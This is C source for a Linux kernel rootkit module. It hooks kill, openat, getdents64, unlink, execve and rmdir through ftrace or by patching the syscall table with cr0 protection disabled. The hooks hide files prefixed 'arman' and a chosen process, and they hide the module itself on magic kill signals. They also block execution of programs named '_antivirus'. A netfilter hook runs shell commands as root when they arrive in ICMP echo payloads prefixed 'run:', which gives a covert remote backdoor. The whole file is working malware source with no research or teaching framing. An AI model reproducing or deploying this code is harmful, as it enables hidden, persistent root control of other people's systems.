#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ftrace.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/uaccess.h>

// Using ftrace flag

#define FTRACE 1

// Saving current module

#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module *)0)
#endif

// Defining prefixes for hooks logic

#define HIDE_PREFIX     "arman"
#define EXEC_PREFIC     "_antivirus"
#define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
#define RM_DIR       "virus"

#define MAX_CMD_LEN 1976

// Hooked signals

#define HIDEMODULE      64
#define SHOWMODULE      63
#define HIDEPROCESS     62
#define SHOWPROCESS     61

// Syscall table address pointer
unsigned long *__sys_call_table_addr;
static struct list_head *prev_module;

char cmd_string[MAX_CMD_LEN];
char pid_to_hide[NAME_MAX];
struct work_struct my_work;

static struct nf_hook_ops nfho;

// Using kprobes method for getting syscall table address for new versions of kernel
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
		.symbol_name = name
	};

    unsigned long ret_value;

    if (register_kprobe(&kp) < 0) return 0;

    ret_value = (unsigned long) kp.addr;
    unregister_kprobe(&kp);

    return ret_value;
}

#else

static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}

#endif

#ifdef KPROBE_

// Defining kprobe for syscall_table
typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);

static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif

// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
#ifdef CONFIG_X86

#include <asm/paravirt.h>
#define PTREGS_MODIF

// For new versions of kernel ptregs_t type serves as a syscall wrapepr
typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);

static syscall_wrapper orig_kill;
static syscall_wrapper orig_sys_openat;
static syscall_wrapper orig_sys_getdents64;
static syscall_wrapper orig_unlink;
static syscall_wrapper orig_execve;
static syscall_wrapper orig_rmdir;


static inline void write_forced_cr0(unsigned long value)
{
    unsigned long __force_order;

    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    pr_info("Unprotected memory\n");
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
    pr_info("Protected memory\n");
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUBS 1
#endif

#endif

#ifdef FTRACE

#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)
#else
#define SYSCALL_NAME(name) (name)
#endif

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

#define HOOK(_name, _function, _original)	\
	{					                    \
		.name = SYSCALL_NAME(_name),	    \
		.function = (_function),	        \
		.original = (_original),	        \
	}

static int ftraceh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = lookup_name(hook->name);

	if (!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

	*((unsigned long*) hook->original) = hook->address;

	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

int ftraceh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = ftraceh_resolve_hook_address(hook);
	if (err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	                | FTRACE_OPS_FL_RECURSION
	                | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);

	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);

	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

void ftraceh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);

	if (err) pr_debug("unregister_ftrace_function() failed: %d\n", err);

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);

	if (err) pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
}

int ftraceh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err = 0;

    for (size_t i = 0; i < count && !err; i++) {
        err = ftraceh_install_hook(&hooks[i]);
        if (err) {
            while (i != 0) {
                ftraceh_remove_hook(&hooks[--i]);
            }
        }
    }

    return err;
}

void ftraceh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	for (size_t i = 0; i < count; i++)
		ftraceh_remove_hook(&hooks[i]);
}

#endif

// Modified syscalls
#ifdef PTREGS_MODIF

static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
{
    int sig = regs->si;
    pid_t pid = regs->di;

    void show_module(void);
    void hide_module(void);

    char cur_pid[NAME_MAX];

    if (sig == 50) {
        unsigned long address = lookup_name("__x64_sys_write");

        printk(KERN_INFO "sys_write address %lx\n", address);

        return 0;
    }

    if (sig == HIDEPROCESS) {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(pid_to_hide, "%d%", pid);
        return 0;
    }

    if (sig == SHOWPROCESS) {
        pid_to_hide[0] = '\0';
        return 0;
    }

    if (sig == HIDEMODULE) {
        hide_module();
        return 0;
    }

    if (sig == SHOWMODULE) {
        show_module();
        return 0;
    }

    sprintf(cur_pid, "%d%", pid);

    if (strcmp(cur_pid, pid_to_hide) == 0) {
        printk(KERN_INFO "rootkit: can't delete process with pid %d\n", pid);
        return 0;
    }

    return orig_kill(regs);
}

static asmlinkage long fh_sys_openat(struct pt_regs *regs)
{
    const char __user* pathname = (const char __user *)regs->si;

	long err;
	char *kernel_filename = NULL;

    int pathlen = strnlen_user(pathname, 256);
    kernel_filename = kzalloc(pathlen, GFP_KERNEL);

    if (kernel_filename == NULL)
        return -ENOENT;

    err = copy_from_user(kernel_filename, pathname, pathlen);
    if (err)
        return -EACCES;

    if (strstr(kernel_filename, HIDE_PREFIX) != NULL) {
        kfree(kernel_filename);
        return -ENOENT;
    }

	kfree(kernel_filename);

	return orig_sys_openat(regs);
}

asmlinkage long h_unlink(struct pt_regs *regs)
{
    const char __user *pathname = regs->di;
    char buf[HIDE_PREFIX_SZ + 1];

    // Copy the user-space pathname to kernel space
    if (strncpy_from_user(buf, pathname, HIDE_PREFIX_SZ) < 0)
        return -EFAULT;

    // Null-terminate the copied string
    buf[HIDE_PREFIX_SZ] = '\0';

    printk(KERN_ALERT "Permission denied for arman: %s\n", buf);

    // Check if the file starts with "arman"
    if (strstr(buf, HIDE_PREFIX) != NULL) {
        printk(KERN_ALERT "Permission denied for arman: %s\n", buf);
        return -EPERM;
    }

    return orig_unlink(regs);
}

static asmlinkage long h_sys_getdents64(struct pt_regs *regs)
{
    unsigned int fd = regs->di;
    unsigned int count = regs->dx;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;

    int buff;
    struct linux_dirent64 __user *ent;
    char *dbuf;

    long ret = orig_sys_getdents64(regs);

    if (ret <= 0) return ret;

    dbuf = kmalloc(ret, GFP_KERNEL);
	memset(dbuf, 0, ret);
	copy_from_user(dbuf, dirent, ret);

    for (buff = 0; buff < ret;) {
		ent = (struct linux_dirent64*)(dbuf + buff);

		if (
                strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0
                ||
                (strncmp(pid_to_hide, "", NAME_MAX) != 0 && strcmp(ent->d_name, pid_to_hide) == 0)
                ) {
			size_t reclen = ent->d_reclen;

			memcpy(dbuf + buff, dbuf + buff + reclen, ret - (buff + reclen));
			ret -= reclen;
		} else {
			buff += ent->d_reclen;
		}
	}

	copy_to_user(dirent, dbuf, ret);
	kfree(dbuf);
	return ret;
}

static asmlinkage long h_sys_execve(struct pt_regs *regs)
{
    char * exec_str = NULL;
    const char __user *filename = (const char __user *)regs->di;

    int exec_line_size = strnlen_user(filename, 256);
    exec_str = kzalloc(exec_line_size, GFP_KERNEL);

    copy_from_user(exec_str, filename, exec_line_size);
    exec_str[exec_line_size] = '\0';

    if (exec_str != NULL){
        if (strstr(exec_str, EXEC_PREFIC) != NULL){
            printk(KERN_ALERT "Antivirus caught!!\n");
            return -EACCES;
        }
    }

    return orig_execve(regs);
}

static asmlinkage long h_sys_rmdir(struct pt_regs *regs)
{
    char * dir_str = NULL;
    const char __user *dir_name = (const char __user *)regs->di;

    int dir_name_size = strnlen_user(dir_name, 256);
    dir_str = kzalloc(dir_name_size, GFP_KERNEL);

    copy_from_user(dir_str, dir_name, dir_name_size);
    dir_str[dir_name_size] = '\0';

    if (dir_str != NULL){
        if (strstr(dir_str, RM_DIR) != NULL){
            printk(KERN_ALERT "Dir found!!\n");
            return -EACCES;
        }
    }

    return orig_rmdir(regs);
}

#endif

void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_module(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

// Working with syscalls

static void store_kill(void)
{
    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
}


static void hook_kill(void)
{
    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
}


static void restore_kill(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
}

static void store_openat(void)
{
    orig_sys_openat = (syscall_wrapper)__sys_call_table_addr[__NR_openat];
}


static void hook_openat(void)
{
    __sys_call_table_addr[__NR_openat] = (unsigned long)&fh_sys_openat;
}


static void restore_openat(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_openat] = (unsigned long)orig_sys_openat;
}


static void store_getdents64(void)
{
    orig_sys_getdents64 = (syscall_wrapper)__sys_call_table_addr[__NR_getdents64];
}


static void hook_getdents64(void)
{
    __sys_call_table_addr[__NR_getdents64] = (unsigned long)&h_sys_getdents64;
}


static void restore_getdents64(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
}

static void store_unlink(void)
{
    orig_unlink = (syscall_wrapper)__sys_call_table_addr[__NR_unlink];
}


static void hook_unlink(void)
{
    __sys_call_table_addr[__NR_unlink] = (unsigned long)&h_unlink;
}


static void restore_unlink(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_unlink] = (unsigned long)orig_unlink;
}

static void store_execve(void)
{
    orig_execve = (syscall_wrapper)__sys_call_table_addr[__NR_execve];
}

static void hook_execve(void)
{
    __sys_call_table_addr[__NR_execve] = (unsigned long)&h_sys_execve;
}

static void restore_execve(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_execve] = (unsigned long)orig_execve;
}

static void store_rmdir(void)
{
    orig_rmdir = (syscall_wrapper)__sys_call_table_addr[__NR_rmdir];
}

static void hook_rmdir(void)
{
    __sys_call_table_addr[__NR_rmdir] = (unsigned long)&h_sys_rmdir;
}

static void restore_rmdir(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_rmdir] = (unsigned long)orig_rmdir;
}

static void work_handler(struct work_struct * work)
{
    static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
    static char *envp[] = {"PATH=/bin:/sbin", NULL};

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

DECLARE_WORK(my_work, work_handler);

static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    int j = 0;

    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);

    if (iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    j = 0;
    while (user_data != tail){
        char c = *user_data;

        cmd_string[j] = c;
        j++;

        if (c == '\0' || j == MAX_CMD_LEN){
            break;
        }

        user_data++;
    }

    pr_info("cmd_string: %s\n", cmd_string);

    if (strncmp(cmd_string, "run:", 4) == 0) {
        for (j = 0; cmd_string[j + 4] != '\0'; j++) {
            cmd_string[j] = cmd_string[j + 4];
        }
        cmd_string[j] = '\0';

        schedule_work(&my_work);
    }

    return NF_ACCEPT;
}

#ifdef FTRACE
static struct ftrace_hook ftrace_hooks[] = {
        HOOK("sys_kill", hack_kill_syscall, &orig_kill),
        HOOK("sys_openat", fh_sys_openat, &orig_sys_openat),
        HOOK("sys_getdents64", h_sys_getdents64, &orig_sys_getdents64),
        HOOK("sys_unlink", h_unlink, &orig_unlink),
        HOOK("sys_execve", h_sys_execve, &orig_execve),
        HOOK("sys_rmdir", h_sys_rmdir, &orig_rmdir),
};
#endif

// Function that launches when module is inserted
static int __init mod_init(void)
{
    pr_info("rootkit: started\n");

    nfho.hook = icmp_cmd_executor;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);

#ifdef KPROBE_

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif

#ifdef FTRACE
    ftraceh_install_hooks(ftrace_hooks, ARRAY_SIZE(ftrace_hooks));
#else
    __sys_call_table_addr = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    store_kill();
    store_openat();
    store_getdents64();
    store_unlink();
    store_execve();
    store_rmdir();

    unprotect_memory();
    
    hook_kill();
    hook_getdents64();
    hook_openat();
    hook_unlink();
    hook_execve();
    hook_rmdir();

    protect_memory();
#endif

    return 0;
}


// Function that launches when module is released
static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");

#ifdef FTRACE
    ftraceh_remove_hooks(ftrace_hooks, ARRAY_SIZE(ftrace_hooks));
#else
    unprotect_memory();

    restore_kill();
    restore_openat();
    restore_getdents64();
    restore_unlink();
    restore_execve();
    restore_rmdir();

    protect_memory();
#endif

    nf_unregister_net_hook(&init_net, &nfho);
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
